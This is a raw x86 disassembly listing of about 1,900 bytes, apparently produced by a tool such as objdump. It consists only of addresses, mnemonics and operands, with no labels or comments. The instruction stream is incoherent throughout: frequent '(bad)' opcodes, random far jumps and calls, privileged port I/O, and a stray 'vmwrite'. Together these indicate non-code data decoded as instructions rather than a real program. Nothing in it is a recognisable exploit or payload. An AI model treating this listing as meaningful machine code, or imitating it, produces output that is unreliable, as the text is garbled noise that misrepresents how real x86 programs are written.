  51d4bf:	cdq    
  51d4c0:	clc    
  51d4c1:	ror    edx,0xb6
  51d4c4:	mov    es,WORD PTR [edx-0x1f]
  51d4c7:	dec    esp
  51d4c8:	dec    edx
  51d4c9:	mov    ebp,0x20c74042
  51d4ce:	adc    DWORD PTR [edi+0x34],0x83cd7bb8
  51d4d5:	pop    esi
  51d4d6:	retf   
  51d4d7:	adc    esi,DWORD PTR [esi-0x2]
  51d4da:	xor    BYTE PTR [ecx],ch
  51d4dc:	fadd   DWORD PTR [eax]
  51d4de:	jno    0x51d506
  51d4e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51d4e1:	pushf  
  51d4e2:	nop
  51d4e3:	icebp  
  51d4e4:	mov    al,ds:0x9c6412dc
  51d4e9:	call   0xa66b:0xfc526f79
  51d4f0:	retf   0xbbd5
  51d4f3:	push   ds
  51d4f4:	ds mov ebx,0x139ff489
  51d4fa:	loopne 0x51d506
  51d4fc:	ret    
  51d4fd:	shl    BYTE PTR [edi+0x5b85b59c],cl
  51d503:	scas   eax,DWORD PTR es:[edi]
  51d504:	mov    esi,0xa4fd732
  51d509:	jge    0x51d4c9
  51d50b:	or     bl,cl
  51d50d:	jbe    0x51d515
  51d50f:	bound  ebp,QWORD PTR [edi+0x5c2bb4f6]
  51d515:	adc    bl,ah
  51d517:	stos   BYTE PTR es:[edi],al
  51d518:	jmp    0xe430:0x6050e4f1
  51d51f:	aam    0x8d
  51d521:	xchg   ebp,eax
  51d522:	iret   
  51d523:	xor    eax,esi
  51d525:	mov    esi,DWORD PTR [edi-0x6]
  51d528:	pop    ds
  51d529:	xor    ah,BYTE PTR [edx+0x6e06fc53]
  51d52f:	cmp    al,0xc1
  51d531:	shl    BYTE PTR [edi-0x58],1
  51d534:	xchg   edx,eax
  51d535:	loope  0x51d546
  51d537:	cdq    
  51d538:	(bad)  
  51d539:	mov    ebp,0x2693d932
  51d53e:	stos   DWORD PTR es:[edi],eax
  51d53f:	ins    BYTE PTR es:[edi],dx
  51d540:	xor    ebx,DWORD PTR [edi]
  51d542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51d543:	pop    es
  51d544:	ret    
  51d545:	(bad)  
  51d547:	dec    esp
  51d548:	xchg   BYTE PTR [eax],ah
  51d54a:	or     al,0xe3
  51d54c:	sbb    ebx,ebx
  51d54e:	or     eax,0x1e3c4cec
  51d553:	push   0x14d51751
  51d558:	xchg   ebx,eax
  51d559:	psrad  mm6,QWORD PTR [esi]
  51d55c:	xor    esp,DWORD PTR [ebx]
  51d55e:	dec    edi
  51d55f:	mov    esi,?
  51d561:	adc    eax,0x836e54c0
  51d566:	push   edx
  51d567:	add    BYTE PTR [ebp+0x61],ch
  51d56a:	mov    esp,ds
  51d56c:	scas   al,BYTE PTR es:[edi]
  51d56d:	inc    edx
  51d56e:	push   eax
  51d56f:	test   DWORD PTR [edi+edx*1],eax
  51d572:	loopne 0x51d563
  51d574:	popa   
  51d575:	pop    edx
  51d576:	jle    0x51d57a
  51d578:	repnz pusha 
  51d57a:	pusha  
  51d57b:	jbe    0x51d573
  51d57d:	sbb    eax,0x5b917789
  51d582:	mov    esp,0xd551159a
  51d587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51d588:	cmp    edi,DWORD PTR ds:0xb1917f3c
  51d58e:	clc    
  51d58f:	sahf   
  51d590:	push   DWORD PTR [edx+0x51c7aebd]
  51d596:	jmp    0xfeab:0xb95e24e8
  51d59d:	mov    BYTE PTR [esp+esi*4-0x4bdd199c],al
  51d5a4:	imul   esi,eax,0x81df6294
  51d5aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51d5ab:	(bad)  
  51d5ac:	ds add edx,edx
  51d5af:	mov    ah,0x1f
  51d5b1:	nop
  51d5b2:	mov    BYTE PTR [edi],ah
  51d5b4:	inc    esp
  51d5b5:	ins    DWORD PTR es:[edi],dx
  51d5b6:	push   eax
  51d5b7:	(bad)  [edx+0x3]
  51d5ba:	iret   
  51d5bb:	xchg   BYTE PTR [ebp-0x75],ch
  51d5be:	dec    edi
  51d5bf:	add    bl,BYTE PTR [edi]
  51d5c1:	fucomp st(6)
  51d5c3:	mov    dl,0xa1
  51d5c5:	sar    BYTE PTR [ecx+0x3c],0x89
  51d5c9:	dec    BYTE PTR [edx+0xb]
  51d5cc:	aaa    
  51d5cd:	adc    DWORD PTR [edi],edx
  51d5cf:	int3   
  51d5d0:	shl    DWORD PTR [esi],0x8b
  51d5d3:	rol    DWORD PTR [eax+ebp*1],cl
  51d5d6:	imul   ecx,DWORD PTR [eax-0x74afbcca],0xffffffd8
  51d5dd:	sub    BYTE PTR [edi],cl
  51d5df:	xchg   esi,eax
  51d5e0:	sub    al,cl
  51d5e2:	(bad)  
  51d5e3:	jl     0x51d581
  51d5e5:	inc    eax
  51d5e6:	(bad)  
  51d5e8:	pop    eax
  51d5e9:	fs inc edi
  51d5eb:	loope  0x51d56e
  51d5ed:	dec    edi
  51d5ee:	stc    
  51d5ef:	inc    BYTE PTR [ebp+0x17]
  51d5f2:	xchg   edx,eax
  51d5f3:	xor    eax,0xc7b7fa5f
  51d5f8:	ins    DWORD PTR es:[edi],dx
  51d5f9:	fstp   TBYTE PTR [edx+eax*2]
  51d5fc:	cmc    
  51d5fd:	adc    eax,0x60d918ef
  51d602:	cmp    BYTE PTR [edx+0x1cbaee48],bh
  51d608:	jno    0x51d5f3
  51d60a:	inc    edx
  51d60b:	push   esi
  51d60c:	sbb    BYTE PTR [edi+0x14],ah
  51d60f:	mov    ch,0xea
  51d611:	mov    ds:0x12ffdc68,eax
  51d616:	rol    DWORD PTR [edi-0xd],cl
  51d619:	out    0xc6,eax
  51d61b:	pop    es
  51d61c:	sbb    al,0x25
  51d61e:	stos   DWORD PTR es:[edi],eax
  51d61f:	test   BYTE PTR [ebx],bl
  51d621:	int3   
  51d622:	xor    DWORD PTR [ebx-0x73882886],ebp
  51d628:	in     eax,dx
  51d629:	(bad)  
  51d62c:	(bad)  
  51d62d:	cmp    bl,cl
  51d62f:	xor    esp,DWORD PTR [edx-0x64f8ce2a]
  51d635:	push   ss
  51d636:	xor    BYTE PTR [edi-0x2c],bl
  51d639:	dec    edi
  51d63a:	retf   
  51d63b:	ins    DWORD PTR es:[edi],dx
  51d63c:	or     al,0x30
  51d63e:	and    BYTE PTR [eax-0x70],dl
  51d641:	sub    DWORD PTR [eax],ecx
  51d643:	and    dh,BYTE PTR [esi-0x22d27cb6]
  51d649:	push   0x5f
  51d64b:	add    eax,0xb4766af
  51d650:	push   esp
  51d651:	dec    eax
  51d652:	int3   
  51d653:	lahf   
  51d654:	int    0xc9
  51d656:	(bad)  [esi]
  51d658:	repnz stc 
  51d65a:	gs into 
  51d65c:	fdivr  QWORD PTR [esi]
  51d65e:	das    
  51d65f:	aad    0x25
  51d661:	and    dl,al
  51d663:	dec    edi
  51d664:	pop    ds
  51d665:	xor    ecx,DWORD PTR [edi+ecx*2]
  51d668:	sub    DWORD PTR [ebp+0x39],0x5a73a54
  51d66f:	push   edx
  51d670:	or     BYTE PTR [edi-0x783d1054],cl
  51d676:	in     eax,0x17
  51d678:	pop    ebx
  51d679:	jle    0x51d627
  51d67b:	iret   
  51d67c:	scas   al,BYTE PTR es:[edi]
  51d67d:	mov    eax,0xb4d2382f
  51d682:	lock push ecx
  51d684:	lods   al,BYTE PTR ds:[esi]
  51d685:	stc    
  51d686:	sub    DWORD PTR [ebp+0x3a],0x60
  51d68a:	jnp    0x51d6a4
  51d68c:	sbb    esi,DWORD PTR [bp+si]
  51d68f:	pushf  
  51d690:	pusha  
  51d691:	out    0x2b,eax
  51d693:	add    bl,dh
  51d695:	xlat   BYTE PTR ds:[ebx]
  51d696:	jmp    0x26f5d36
  51d69b:	sbb    bl,BYTE PTR [eax-0x54ad3b40]
  51d6a1:	dec    edx
  51d6a2:	pop    ecx
  51d6a3:	in     eax,dx
  51d6a4:	fsub   st(5),st
  51d6a6:	mov    ebx,ebp
  51d6a8:	dec    eax
  51d6a9:	pop    ds
  51d6aa:	sbb    eax,0xb4729702
  51d6af:	leave  
  51d6b0:	ret    0x9ad6
  51d6b3:	mov    cl,0xa4
  51d6b5:	or     al,BYTE PTR [ecx+0x41c3b77f]
  51d6bb:	in     eax,dx
  51d6bc:	fsubr  st,st(1)
  51d6be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51d6bf:	popf   
  51d6c0:	mov    WORD PTR [eax],?
  51d6c2:	xor    ebp,DWORD PTR [ebp+0x692e8b5e]
  51d6c8:	dec    ebx
  51d6c9:	fnstenv fs:[ebp+edi*2+0x6c]
  51d6ce:	push   ecx
  51d6cf:	not    BYTE PTR es:[esi-0x359ef259]
  51d6d6:	sub    esi,DWORD PTR [edx+edx*2-0x65]
  51d6da:	aaa    
  51d6db:	cmc    
  51d6dc:	and    DWORD PTR ds:0x8219f2dc,edx
  51d6e2:	(bad)  
  51d6e3:	jmp    0x4e7c589
  51d6e8:	fist   WORD PTR [ebp-0x2c]
  51d6eb:	mov    al,0xdc
  51d6ed:	scas   eax,DWORD PTR es:[edi]
  51d6ee:	mov    dh,0xdc
  51d6f0:	xor    bh,0x1f
  51d6f3:	push   ecx
  51d6f4:	aaa    
  51d6f5:	call   0x34b6eb9f
  51d6fa:	mov    DWORD PTR [ebx+esi*8],ecx
  51d6fd:	dec    ecx
  51d6fe:	push   ecx
  51d6ff:	mov    esi,0xc0b08c97
  51d704:	jbe    0x51d74b
  51d706:	ja     0x51d730
  51d708:	fisubr DWORD PTR [esp+edi*4+0xa79498]
  51d70f:	(bad)  
  51d710:	fwait
  51d711:	stos   DWORD PTR es:[edi],eax
  51d712:	arpl   bp,dx
  51d714:	xchg   ebp,eax
  51d715:	sbb    ch,dh
  51d717:	es dec ebp
  51d719:	mov    DWORD PTR [ecx+0x3c],ebp
  51d71c:	popf   
  51d71d:	push   cs
  51d71e:	in     al,dx
  51d71f:	es push ebp
  51d721:	lock in al,0x63
  51d724:	vmwrite esp,DWORD PTR [edx+0xacb5a9c]
  51d72b:	cmp    al,cl
  51d72d:	xor    cl,BYTE PTR [esi+edx*4-0x298ec4ea]
  51d734:	dec    ebp
  51d735:	fist   DWORD PTR [edx]
  51d737:	push   ss
  51d738:	xor    BYTE PTR [ebx],cl
  51d73a:	inc    esp
  51d73b:	add    DWORD PTR [ebx+ebx*4],edx
  51d73e:	dec    esp
  51d73f:	mov    ds:0x90b02ee7,al
  51d744:	xchg   eax,ecx
  51d746:	add    bh,cl
  51d748:	mov    ch,0x73
  51d74a:	adc    dh,bl
  51d74c:	mov    ds:0x947bd2c6,eax
  51d751:	dec    edi
  51d752:	cli    
  51d753:	fidiv  DWORD PTR [edi-0x4e]
  51d756:	xor    BYTE PTR fs:0xd5453f9f,bl
  51d75d:	jmp    0xad5f:0xb3684902
  51d764:	imul   edi,DWORD PTR [eax],0xcae08523
  51d76a:	cmp    eax,0x6099195c
  51d76f:	and    DWORD PTR [ecx+ebx*1-0x3],0x29d443d6
  51d777:	clc    
  51d778:	mov    eax,ds:0xa2af0dbe
  51d77d:	mov    dh,0xdf
  51d77f:	and    al,0x91
  51d781:	retf   0x435a
  51d784:	lods   eax,DWORD PTR ds:[esi]
  51d785:	jp     0x51d733
  51d787:	pop    esi
  51d788:	cli    
  51d789:	push   esi
  51d78a:	inc    edi
  51d78b:	lods   eax,DWORD PTR ds:[esi]
  51d78c:	rcl    BYTE PTR [edx+ecx*4-0x5d],0x55
  51d791:	lahf   
  51d792:	lods   al,BYTE PTR ds:[esi]
  51d793:	push   ebx
  51d794:	mov    ecx,0x39d9d8ba
  51d799:	lahf   
  51d79a:	out    dx,al
  51d79b:	xchg   DWORD PTR [eax+0x91acbd3],edx
  51d7a1:	push   edi
  51d7a2:	scas   al,BYTE PTR es:[edi]
  51d7a3:	pushf  
  51d7a4:	retf   0x4be9
  51d7a7:	jns    0x51d7a9
  51d7a9:	or     al,0xb7
  51d7ab:	sbb    esi,DWORD PTR ds:0xa66bedde
  51d7b1:	imul   esi,DWORD PTR [eax-0x1],0xcacf2ad
  51d7b8:	fisubr DWORD PTR [edi+esi*1+0x7d89841b]
  51d7bf:	scas   al,BYTE PTR es:[edi]
  51d7c0:	lds    esp,FWORD PTR [ebp+0x2473dde2]
  51d7c6:	(bad)  
  51d7c7:	cmp    al,0x91
  51d7c9:	mov    dh,0xdc
  51d7cb:	scas   al,BYTE PTR es:[edi]
  51d7cc:	xor    cl,BYTE PTR [ecx]
  51d7ce:	mov    esp,DWORD PTR [edi]
  51d7d0:	or     dl,BYTE PTR [edi-0x13efbbc2]
  51d7d6:	cmp    ebp,ebx
  51d7d8:	aam    0x27
  51d7da:	sub    al,0x8b
  51d7dc:	jmp    0x3a09dada
  51d7e1:	test   al,0x15
  51d7e3:	xlat   BYTE PTR ds:[ebx]
  51d7e4:	sahf   
  51d7e5:	ss popf 
  51d7e7:	sbb    ebx,esp
  51d7e9:	aaa    
  51d7ea:	nop
  51d7eb:	loope  0x51d82f
  51d7ed:	and    DWORD PTR [edx+esi*8],ebp
  51d7f0:	mov    esp,0x4ad393ef
  51d7f5:	imul   edi,DWORD PTR [esi+0x7f],0xffffffa8
  51d7f9:	jo     0x51d7bc
  51d7fb:	dec    edx
  51d7fc:	xchg   edx,eax
  51d7fd:	xchg   esp,eax
  51d7fe:	das    
  51d7ff:	sub    eax,0x24294c7e
  51d804:	lods   eax,DWORD PTR ds:[esi]
  51d805:	push   es
  51d806:	out    dx,al
  51d807:	sub    eax,0x66f2fcb1
  51d80c:	iret   
  51d80d:	fs in  eax,dx
  51d80f:	jno    0x51d7ee
  51d811:	mov    ss,WORD PTR [eax+0x20f58b4f]
  51d817:	mov    ds:0x1cae9c22,eax
  51d81c:	loopne 0x51d807
  51d81e:	out    dx,eax
  51d81f:	test   DWORD PTR [ebp+0x45d4038],0xb5271998
  51d829:	shl    BYTE PTR [edi-0x22b0715],cl
  51d82f:	repz pushf 
  51d831:	ds cdq 
  51d833:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  51d835:	add    edi,edx
  51d837:	jle    0x51d86a
  51d839:	and    eax,0x6ae6ef4a
  51d83e:	in     al,0x6b
  51d840:	enter  0x7ca2,0x22
  51d844:	ret    0x80f2
  51d847:	or     dh,BYTE PTR [edi+edi*2+0x79]
  51d84b:	sub    eax,0xb2ad183
  51d850:	outs   dx,DWORD PTR ds:[esi]
  51d851:	out    dx,al
  51d852:	fisub  WORD PTR [ebx]
  51d854:	or     dh,dh
  51d856:	int3   
  51d857:	adc    cl,BYTE PTR [edi+0x6c]
  51d85a:	adc    eax,0x33b1834a
  51d85f:	jmp    0x51d7e2
  51d861:	sub    al,0xba
  51d863:	mov    al,ds:0x169b9230
  51d868:	fsubr  DWORD PTR [edi]
  51d86a:	push   edx
  51d86b:	mov    cl,0x21
  51d86d:	sbb    ebx,DWORD PTR [edi-0x30cfc66b]
  51d873:	(bad)
  51d877:	mov    dh,0x3f
  51d879:	xchg   ecx,eax
  51d87a:	std    
  51d87b:	cmp    dl,BYTE PTR [edx-0x6b]
  51d87e:	les    ebp,FWORD PTR [edi+0x334e64b0]
  51d884:	pop    esi
  51d885:	push   esp
  51d886:	jb     0x51d8f7
  51d888:	mov    ds:0x30b0c513,al
  51d88d:	and    BYTE PTR [edx+eax*4-0x475f14ca],bh
  51d894:	addr16 (bad) 
  51d896:	pushf  
  51d897:	pop    edx
  51d898:	pop    ebp
  51d899:	pop    ebx
  51d89a:	sbb    al,0xe8
  51d89c:	popf   
  51d89d:	cmc    
  51d89e:	loope  0x51d85c
  51d8a0:	xchg   ebx,eax
  51d8a1:	ins    BYTE PTR es:[edi],dx
  51d8a2:	cld    
  51d8a3:	pop    edi
  51d8a4:	push   eax
  51d8a5:	xchg   DWORD PTR [edx+0x5be27026],edx
  51d8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51d8ac:	adc    edx,eax
  51d8ae:	and    DWORD PTR [ecx+0x1f],0x64c5888e
  51d8b5:	sub    esi,DWORD PTR ds:[esi+0x50]
  51d8b9:	fst    QWORD PTR [eax+0x30265e81]
  51d8bf:	mov    edi,0xdb9056da
  51d8c4:	ret    
  51d8c5:	xor    ecx,DWORD PTR [edi+0x71]
  51d8c8:	and    ecx,DWORD PTR [ebx]
  51d8ca:	popa   
  51d8cb:	mov    ebx,DWORD PTR [esi+0x3a56e7fc]
  51d8d1:	jb     0x51d898
  51d8d3:	and    eax,ecx
  51d8d5:	push   ebp
  51d8d6:	jge    0x51d8b7
  51d8d8:	test   al,al
  51d8da:	inc    ebx
  51d8db:	jbe    0x51d864
  51d8dd:	(bad)  
  51d8de:	pushf  
  51d8df:	enter  0x55d2,0xce
  51d8e3:	outs   dx,BYTE PTR ds:[esi]
  51d8e4:	lahf   
  51d8e5:	cmp    BYTE PTR [ebx],dl
  51d8e7:	shl    DWORD PTR [ebx],cl
  51d8e9:	add    eax,0x5c0cd37
  51d8ee:	jne    0x51d938
  51d8f0:	jmp    0xe06a:0x884db376
  51d8f7:	mov    bl,0x8a
  51d8f9:	xchg   esp,eax
  51d8fa:	mov    ebp,0x7d660ad0
  51d8ff:	in     eax,dx
  51d900:	shl    BYTE PTR [ebp+0x47],cl
  51d903:	(bad)
  51d906:	dec    ecx
  51d907:	inc    ebp
  51d908:	je     0x51d8d5
  51d90a:	lods   eax,DWORD PTR ds:[esi]
  51d90b:	mov    eax,0xd2be83f7
  51d910:	cmp    DWORD PTR [ebp+0x5df0dd5c],edi
  51d916:	xor    DWORD PTR [ecx-0x28],esi
  51d919:	mov    eax,0x33dfb7b2
  51d91e:	int3   
  51d91f:	xor    eax,0x171a3feb
  51d924:	add    dh,BYTE PTR [eax]
  51d926:	adc    al,0xb2
  51d928:	push   ebp
  51d929:	or     eax,0x6a06bf93
  51d92e:	aam    0xf3
  51d930:	fwait
  51d931:	call   0x2510eb90
  51d936:	in     al,0xaa
  51d938:	imul   ebp,ecx,0x5f
  51d93b:	jne    0x51d936
  51d93d:	fsub   st(5),st
  51d93f:	adc    al,BYTE PTR [edi]
  51d941:	push   ecx
  51d942:	xor    dh,BYTE PTR [ecx+0x6799dd7]
  51d948:	xor    BYTE PTR [esi+0x9],cl
  51d94b:	jnp    0x51d8de
  51d94d:	mov    eax,ds:0x6e4e79f5
  51d952:	sub    bl,BYTE PTR [ebx-0x30]
  51d955:	or     dl,BYTE PTR [ebp+0x52]
  51d958:	mov    edx,0x9880e0ba
  51d95d:	out    dx,al
  51d95e:	fadd   st,st(0)
  51d960:	xor    DWORD PTR [ebp-0x7d],eax
  51d963:	inc    eax
  51d964:	cmp    eax,DWORD PTR [edx-0xa]
  51d967:	push   cs
  51d968:	xor    eax,0x1b33566
  51d96d:	jmp    0x51d978
  51d96f:	xchg   esp,eax
  51d970:	sub    al,0x4b
  51d972:	call   0x466e:0x5ed593b6
  51d979:	pusha  
  51d97a:	adc    eax,0xa2e87a69
  51d97f:	mov    WORD PTR [ecx+ecx*8],?
  51d982:	inc    eax
  51d983:	jle    0x51d9bd
  51d985:	xchg   esi,eax
  51d986:	ins    DWORD PTR es:[edi],dx
  51d987:	loop   0x51d97c
  51d989:	ror    BYTE PTR [edi+ecx*4],cl
  51d98c:	outs   dx,BYTE PTR ds:[esi]
  51d98d:	jae    0x51d973
  51d98f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51d990:	retf   
  51d991:	xchg   DWORD PTR [edi-0x5f],ebp
  51d994:	popa   
  51d995:	mov    edi,0xbcfa0069
  51d99a:	add    dl,bl
  51d99c:	lock popa 
  51d99e:	aam    0xde
  51d9a0:	push   ds
  51d9a1:	rcl    bh,0x31
  51d9a4:	add    bh,BYTE PTR ds:0x2764a233
  51d9aa:	pushf  
  51d9ab:	vminps xmm1,xmm6,XMMWORD PTR [edi]
  51d9af:	out    0x25,eax
  51d9b1:	or     ah,BYTE PTR [eax+0x68]
  51d9b4:	inc    ecx
  51d9b5:	(bad)  
  51d9b6:	in     al,0xd5
  51d9b8:	lds    esi,FWORD PTR [eax-0x394ceddf]
  51d9be:	and    ecx,0x454f3210
  51d9c4:	pop    edi
  51d9c5:	(bad)  
  51d9c7:	les    edx,FWORD PTR [edi]
  51d9c9:	inc    ebx
  51d9ca:	in     al,dx
  51d9cb:	fsub   QWORD PTR [esp+esi*8]
  51d9ce:	add    ch,al
  51d9d0:	mov    bh,0x89
  51d9d2:	nop
  51d9d3:	inc    ecx
  51d9d4:	mov    eax,ds:0xee1bf616
  51d9d9:	inc    ebx
  51d9da:	mov    ax,0x9dd3
  51d9de:	or     ebp,ebx
  51d9e0:	popf   
  51d9e1:	cli    
  51d9e2:	mov    al,0xce
  51d9e4:	aas    
  51d9e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51d9e6:	lds    eax,FWORD PTR ds:0xb74dfb1d
  51d9ec:	neg    BYTE PTR [ecx-0x7d7475bf]
  51d9f2:	retf   0x76f8
  51d9f5:	sub    DWORD PTR [ecx],edi
  51d9f7:	aas    
  51d9f8:	sub    edx,esp
  51d9fa:	(bad)  
  51d9fb:	push   ebx
  51d9fc:	jmp    0xd698:0xad8f27a4
  51da03:	dec    edi
  51da04:	xor    DWORD PTR [eax-0x3c],esi
  51da07:	or     bh,0x3d
  51da0a:	and    BYTE PTR [edx],0xa1
  51da0d:	or     eax,0xcab58051
  51da12:	int3   
  51da13:	test   al,0x36
  51da15:	cmp    al,0xf7
  51da17:	sub    eax,0x284b7ac0
  51da1c:	mov    eax,ds:0x9bec2c7b
  51da21:	pop    es
  51da22:	jl     0x51d9bd
  51da24:	pop    esp
  51da25:	pop    esi
  51da26:	adc    eax,0xca439a1
  51da2b:	mov    esi,DWORD PTR [ecx+0x7b]
  51da2e:	mov    ecx,0xf5546468
  51da33:	daa    
  51da34:	std    
  51da35:	and    ebp,0x519c6634
  51da3b:	aaa    
  51da3c:	je     0x51d9c8
  51da3e:	shr    cl,0xa1
  51da41:	xchg   esp,eax
  51da42:	xor    edi,esi
  51da44:	pop    edx
  51da45:	ja     0x51dabb
  51da47:	aaa    
  51da48:	push   ebp
  51da49:	xor    BYTE PTR [esi],dh
  51da4b:	add    bh,BYTE PTR [eax]
  51da4d:	and    esp,ecx
  51da4f:	or     BYTE PTR [ebx+ecx*8+0x61],cl
  51da53:	popf   
  51da54:	js     0x51daad
  51da56:	push   esi
  51da57:	jns    0x51d9f7
  51da59:	int3   
  51da5a:	or     BYTE PTR [edx],cl
  51da5c:	mov    edi,0x22b9ab46
  51da61:	aas    
  51da62:	aas    
  51da63:	mul    DWORD PTR [esi+0x567c398f]
  51da69:	push   es
  51da6a:	mov    al,0x7d
  51da6c:	cs dec edi
  51da6e:	lahf   
  51da6f:	rcl    esi,1
  51da71:	pop    ecx
  51da72:	mov    al,0x3f
  51da74:	(bad)  
  51da75:	adc    ecx,ecx
  51da77:	cmp    eax,DWORD PTR [ecx+0x3ae64f4d]
  51da7d:	lahf   
  51da7e:	jae    0x51dafe
  51da80:	iret   
  51da81:	adc    dl,ch
  51da83:	and    ah,ah
  51da85:	add    ebx,edx
  51da87:	dec    edi
  51da88:	cmp    edi,DWORD PTR [edx-0x4a]
  51da8b:	lods   al,BYTE PTR ds:[esi]
  51da8c:	dec    ebp
  51da8d:	sub    cl,BYTE PTR [ecx-0x76447065]
  51da93:	ins    DWORD PTR es:[edi],dx
  51da94:	mov    eax,ds:0x130e06e0
  51da99:	inc    edx
  51da9a:	test   DWORD PTR [edx-0x2147440e],0x5a04879e
  51daa4:	pushf  
  51daa5:	add    DWORD PTR [esi],edi
  51daa7:	call   0xbdc1:0x73591b9c
  51daae:	inc    esi
  51daaf:	scas   al,BYTE PTR es:[edi]
  51dab0:	push   ss
  51dab1:	fimul  WORD PTR [eax-0x25709a03]
  51dab7:	jae    0x51da59
  51dab9:	pop    edi
  51daba:	inc    ecx
  51dabb:	pop    eax
  51dabc:	add    bh,BYTE PTR [esi+0x36]
  51dabf:	stc    
  51dac0:	(bad)  
  51dac1:	enter  0x8237,0x23
  51dac5:	into   
  51dac6:	shl    ch,1
  51dac8:	xchg   ecx,eax
  51dac9:	mov    cl,0x2a
  51dacb:	jne    0x51dad2
  51dacd:	pop    esi
  51dace:	pop    esi
  51dacf:	lahf   
  51dad0:	inc    esp
  51dad1:	(bad)  
  51dad2:	(bad)  
  51dad3:	std    
  51dad4:	loop   0x51db25
  51dad6:	push   ebp
  51dad7:	sub    eax,0x5953c221
  51dadc:	mov    eax,0x9d7a068f
  51dae1:	(bad)  
  51dae2:	sub    edx,ebx
  51dae4:	jmp    0xa250c644
  51dae9:	inc    edi
  51daea:	ja     0x51da6d
  51daec:	bound  edx,QWORD PTR [ebx+0x41]
  51daef:	push   0xd99907fb
  51daf4:	fdivr  QWORD PTR [esi-0x28]
  51daf7:	and    cl,cl
  51daf9:	push   ebx
  51dafa:	enter  0xbf0a,0x61
  51dafe:	push   esi
  51daff:	xor    DWORD PTR [edx-0x52],esi
  51db02:	jns    0x51db71
  51db04:	std    
  51db05:	bound  eax,QWORD PTR [edi+edx*4]
  51db08:	ss jmp 0x9bcdac5f
  51db0e:	frstor [ebx+0x65f6ef73]
  51db14:	xor    eax,0x7fbfc64c
  51db19:	adc    bh,BYTE PTR [eax-0x5a4ad6f0]
  51db1f:	cmp    BYTE PTR [ebp+edi*8+0x22],al
  51db23:	xchg   edi,eax
  51db24:	pop    ds
  51db25:	in     al,0x8c
  51db27:	jnp    0x51db1d
  51db29:	pop    edi
  51db2a:	(bad)
  51db2e:	or     BYTE PTR [esi+0x15015836],ch
  51db34:	aaa    
  51db35:	in     al,0x79
  51db37:	jl     0x51dafb
  51db39:	sub    ebx,DWORD PTR [ecx-0x4816b707]
  51db3f:	call   0x7da2:0xb20d860
  51db46:	or     dl,bh
  51db48:	ds nop
  51db4a:	not    cl
  51db4c:	mov    ebp,0xa401f2a0
  51db51:	int3   
  51db52:	cwde   
  51db53:	cwde   
  51db54:	fisubr WORD PTR [ebx-0x4e]
  51db57:	retf   
  51db58:	sbb    BYTE PTR [ebx-0x5eb8e8d3],ah
  51db5e:	push   ebx
  51db5f:	addr16 dec esp
  51db61:	(bad)  
  51db62:	jmp    0x9cfe:0x39c30e5
  51db69:	fstp   TBYTE PTR [ebx-0x181331b3]
  51db6f:	inc    edx
  51db70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51db71:	add    BYTE PTR [esi+0x7],cl
  51db74:	jmp    0x51dba9
  51db76:	xchg   ebp,eax
  51db77:	aam    0xdd
  51db79:	sbb    ebp,DWORD PTR [esi-0x6fd2284e]
  51db7f:	inc    esp
  51db80:	inc    esi
  51db81:	cmp    eax,0x1ea829fe
  51db86:	(bad)  
  51db87:	shr    dl,1
  51db89:	ins    BYTE PTR es:[edi],dx
  51db8a:	inc    edx
  51db8b:	jle    0x51dba6
  51db8d:	fs int3 
  51db8f:	into   
  51db90:	int    0x5
  51db92:	out    0xa1,eax
  51db94:	xor    bh,BYTE PTR [eax]
  51db96:	fild   QWORD PTR [ebx+0x24]
  51db99:	mov    cl,0x9f
  51db9b:	retf   0x17b2
  51db9e:	lahf   
  51db9f:	scas   eax,DWORD PTR es:[edi]
  51dba0:	repnz aas 
  51dba2:	loope  0x51dbeb
  51dba4:	inc    eax
  51dba5:	xchg   esi,eax
  51dba6:	inc    ebx
  51dba7:	loop   0x51dbfc
  51dba9:	sbb    esp,esp
  51dbab:	in     al,dx
  51dbac:	add    esp,esi
  51dbae:	neg    BYTE PTR [edi]
  51dbb0:	sbb    ebp,ecx
  51dbb2:	nop
  51dbb3:	(bad)  
  51dbb4:	xlat   BYTE PTR ds:[ebx]
  51dbb5:	or     DWORD PTR [ecx],ebx
  51dbb7:	(bad)  
  51dbb9:	ins    DWORD PTR es:[edi],dx
  51dbba:	xchg   esi,eax
  51dbbb:	xchg   ebx,eax
  51dbbc:	jmp    0xd6e67538
  51dbc1:	(bad)  
  51dbc3:	in     eax,0x5
  51dbc5:	mov    al,ds:0x9118ea1a
  51dbca:	mov    ecx,0x78514bab
  51dbcf:	hlt    
  51dbd0:	sbb    eax,0xd861e7f0
  51dbd5:	cmp    eax,0x9a1e9662
  51dbda:	pop    es
  51dbdb:	scas   eax,DWORD PTR es:[edi]
  51dbdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51dbdd:	push   ecx
  51dbde:	push   0xb2a11581
  51dbe3:	and    ebp,ebx
  51dbe5:	add    ebx,DWORD PTR [ebx+0x1b]
  51dbe8:	gs push 0x2319c3e5
  51dbee:	or     al,0xd1
  51dbf0:	xchg   ebp,eax
  51dbf1:	mov    ch,0x30
  51dbf3:	dec    esp
  51dbf4:	loope  0x51dc71
  51dbf6:	mov    ch,0x3
  51dbf8:	xchg   ebx,eax
  51dbf9:	dec    esp
  51dbfa:	fnstcw WORD PTR [esi+eax*2-0x57ba4061]
  51dc01:	test   al,0x9c
  51dc03:	dec    ebx
  51dc04:	push   ebp
  51dc05:	dec    esi
  51dc06:	lock adc al,0x2b
  51dc09:	test   al,0x22
  51dc0b:	out    dx,eax
  51dc0c:	test   BYTE PTR [edi+ecx*4-0x49693b9e],al
  51dc13:	xchg   DWORD PTR [ecx-0x63],esi
  51dc16:	test   eax,0xff44a0a8
  51dc1b:	push   esi
  51dc1c:	(bad)  
  51dc1d:	fisttp WORD PTR [esi-0x3d92fe52]
  51dc23:	out    0xc3,al
  51dc25:	dec    eax
  51dc26:	sbb    BYTE PTR [ebx+esi*8-0x60f078e6],dl
  51dc2d:	out    dx,al
  51dc2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51dc2f:	stc    
  51dc30:	push   0x38
